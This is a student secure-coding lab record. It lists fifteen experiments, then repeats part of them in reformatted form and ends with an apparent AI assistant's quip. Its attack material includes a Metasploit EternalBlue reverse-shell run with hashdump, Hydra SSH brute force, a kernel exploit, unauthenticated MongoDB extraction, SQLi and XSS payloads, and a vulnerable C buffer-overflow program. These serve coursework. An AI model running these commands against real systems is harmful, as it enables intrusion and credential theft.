21CY612 – Secure Coding Laboratory

TABLE OF CONTENT

1. Attack development with Metasploit  
2. Threat Modelling  
3. Password and Privilege Escalation Attacks  
4. Web Application Hacking  
5. DataStore Attacks  
6. BufferOverflow Attack Demonstration  
7. SQL Injection attack on a WEB APP  
8. Cross Site Scripting (XSS) Attack  
9. Threat Detection with OWASP ZAP  
10. Implementation Authentication and session security  
11. Use of Hashing for Password Storage  
12. Perform Reconnaissance using Nmap  
13. Penetration Testing Lifecycle and Report Creation  
14. Mitigation of Code Injection in Python  
15. Using Nikto to Find Web Server Vulnerabilities  

--------------------------------------------------

EXP NO : 01  
DATE : 13.11.2025  
Attack development with Metasploit  

AIM:  
To perform an attack development simulation using the Metasploit Framework.

STEPS:  
1. Start Metasploit Framework  
2. Search for a suitable exploit  
3. Configure the exploit and payload  
4. Set the target and attacker IP  
5. Launch the exploit  
6. Gain meterpreter session  
7. Perform post-exploitation  

COMMANDS:  
msfconsole  
search exploit/windows/smb/ms17_010_eternalblue  
use exploit/windows/smb/ms17_010_eternalblue  
set RHOSTS <Target_IP>  
set LHOST <Your_Attacker_IP>  
set LPORT 4444  
set PAYLOAD windows/x64/meterpreter/reverse_tcp  
show options  
exploit  

Post Exploitation:  
sysinfo  
getuid  
hashdump  

RESULT:  
Metasploit successfully exploited a vulnerable system.

--------------------------------------------------

EXP NO : 02  
DATE : 20.11.2025  
Threat Modelling  

AIM:  
To perform threat modelling.

STEPS:  
1. Define scope  
2. Identify assets  
3. Create architecture  
4. Identify threats using STRIDE  
5. Document mitigations  
6. Prioritize risks  

STRIDE:  
Spoofing  
Tampering  
Repudiation  
Information Disclosure  
Denial of Service  
Elevation of Privilege  

RESULT:  
Threat model created successfully.

--------------------------------------------------

EXP NO : 03  
DATE : 27.11.2025  
Password and Privilege Escalation Attacks  

AIM:  
To perform password attacks and privilege escalation.

STEPS:  
Password Attack:  
- Identify login service  
- Use Hydra or John  
- Capture credentials  

Privilege Escalation:  
- Login using credentials  
- Enumerate system  
- Exploit vulnerabilities  
- Gain root access  

COMMANDS:  
hydra -l admin -P rockyou.txt <IP> ssh  
whoami  
sudo -l  
uname -a  
searchsploit linux kernel <version>  
gcc exploit.c -o exploit  
./exploit  

RESULT:  
Access gained using brute force.

--------------------------------------------------

EXP NO : 04  
DATE : 04.12.2025  
Web Application Hacking  

AIM:  
To perform web attacks.

STEPS:  
1. Setup vulnerable app  
2. Identify inputs  
3. Perform reconnaissance  
4. Launch attacks: SQLi, XSS, Auth Bypass  
5. Observe behavior  
6. Suggest mitigation  

COMMANDS:  
sudo service apache2 start  
sudo service mysql start  
admin' OR '1'='1  
<script>alert('XSS')</script>  
burpsuite  

RESULT:  
Web vulnerabilities exploited.

--------------------------------------------------

EXP NO : 05  
DATE : 11.12.2025  
DataStore Attacks  

AIM:  
To exploit database vulnerabilities.

STEPS:  
1. Identify database  
2. Scan ports  
3. Connect without auth  
4. Enumerate DB  
5. Extract data  

COMMANDS:  
nmap -p 27017 --open -Pn <IP>  
mongo <IP>:27017  
show dbs  
use testdb  
show collections  
db.users.find()  

RESULT:  
Sensitive data extracted.

--------------------------------------------------

EXP NO : 06  
DATE : 18.12.2025  
BufferOverflow Attack Demonstration  

AIM:  
To demonstrate buffer overflow.

STEPS:  
1. Create program  
2. Compile  
3. Execute  
4. Provide input  
5. Trigger overflow  

COMMANDS:  
gcc -fno-stack-protector -z execstack -no-pie -o oops oops.c  

CODE:  
char buffer[8];  
scanf("%s", buffer);  

RESULT:  
Buffer overflow demonstrated.

--------------------------------------------------

EXP NO : 07  
DATE : 08.01.2026  
SQL Injection Attack  

AIM:  
To bypass authentication.

STEPS:  
1. Create DB  
2. Create login form  
3. Inject payload  

PAYLOAD:  
' OR '1'='1  

RESULT:  
Authentication bypass successful.

--------------------------------------------------

EXP NO : 08  
DATE : 22.01.2026  
Cross Site Scripting (XSS)  

AIM:  
To execute malicious scripts.

STEPS:  
1. Open web app  
2. Find input field  
3. Inject script  

PAYLOAD:  
<script>alert('XSS')</script>  

RESULT:  
Script executed successfully.

--------------------------------------------------

EXP NO : 09  
DATE : 29.01.2026  
Threat Detection with OWASP ZAP  

AIM:  
To scan vulnerabilities.

STEPS:  
1. Launch ZAP  
2. Configure proxy  
3. Scan target  
4. Analyze results  

COMMAND:  
zap.sh  

RESULT:  
Vulnerabilities detected.

--------------------------------------------------

EXP NO : 10  
DATE : 05.02.2026  
Authentication and Session Security  

AIM:  
To implement secure authentication.

STEPS:  
1. Hash passwords  
2. Secure cookies  
3. Regenerate session ID  
4. Set timeout  

COMMANDS:  
password_hash()  
session_regenerate_id()  

RESULT:  
Secure authentication implemented.

--------------------------------------------------

EXP NO : 11  
DATE : 12.02.2026  
Hashing for Password Storage  

AIM:  
To store passwords securely.

STEPS:  
1. Hash password  
2. Store in DB  
3. Verify login  

RESULT:  
Hashing implemented.

--------------------------------------------------

EXP NO : 12  
DATE : 26.02.2026  
Reconnaissance using Nmap  

AIM:  
To gather system information.

COMMANDS:  
nmap <target-ip>  
nmap -sV -O <target-ip>  
nmap -Pn <target-ip>  

RESULT:  
Recon completed.

--------------------------------------------------

EXP NO : 13  
DATE : 05.03.2026  
Penetration Testing Lifecycle  

STEPS:  
1. Planning  
2. Scanning  
3. Gaining Access  
4. Maintaining Access  
5. Clearing Tracks  
6. Reporting  

RESULT:  
Lifecycle understood.

--------------------------------------------------

EXP NO : 14  
DATE : 12.03.2026  
Mitigation of Code Injection  

AIM:  
To prevent code injection.

VULNERABLE:  
eval(user_input)  

SAFE:  
ast.literal_eval(user_input)  

RESULT:  
Injection prevented.

--------------------------------------------------

EXP NO : 15  
DATE : 19.03.2026  
Nikto Scan  

AIM:  
To scan web server.

COMMAND:  
nikto -h <IP>  

RESULT:  
Vulnerabilities identified.---

## Experiment 6: Buffer Overflow

### Aim
To demonstrate buffer overflow in C.

### Code
```c
#include <stdio.h>

void askForUsername() {
    char buffer[8];
    scanf("%s", buffer);
}

int main() {
    while(1) askForUsername();
    return 0;
}

Compile

gcc -fno-stack-protector -z execstack -no-pie -o oops oops.c

Result

Buffer overflow successfully demonstrated.


---

Experiment 7: SQL Injection

Aim

To bypass authentication using SQL Injection.

Payload

' OR '1'='1

Result

Login bypass achieved.


---

Experiment 8: Cross Site Scripting (XSS)

Aim

To inject malicious scripts.

Payload

<script>alert('XSS')</script>

Result

Script executed successfully.


---

Experiment 9: OWASP ZAP

Aim

To scan web app vulnerabilities.

Commands

zap.sh

Result

Detected vulnerabilities like SQLi, XSS.


---

Experiment 10: Authentication & Session Security

Aim

To implement secure authentication.

Commands

$passwordHash = password_hash($password, PASSWORD_BCRYPT);
session_regenerate_id(true);

Result

Secure session handling implemented.


---

Experiment 11: Password Hashing

Aim

To store passwords securely.

Steps

1. Hash password


2. Store in DB


3. Verify during login



Result

Password hashing implemented.


---

Experiment 12: Reconnaissance using Nmap

Aim

To scan target system.

Commands

nmap <target-ip>
nmap -sV -O <target-ip>
nmap -Pn <target-ip>

Result

Collected system information.


---

Experiment 13: Penetration Testing Lifecycle

Steps

1. Planning


2. Scanning


3. Gaining Access


4. Maintaining Access


5. Clearing Tracks


6. Reporting



Result

Pentesting lifecycle understood.


---

Experiment 14: Code Injection Prevention

Vulnerable Code

eval(user_input)

Safe Code

import ast
ast.literal_eval(user_input)

Result

Injection prevented successfully.


---

Experiment 15: Nikto Scan

Aim

To scan web server vulnerabilities.

Command

nikto -h <IP>

Result

Identified server vulnerabilities.


---

---

There. Clean, structured, actually GitHub-worthy instead of that chaotic PDF energy.

If you upload this, at least your repo won’t scream “copied directly from lab record at 2 AM.”
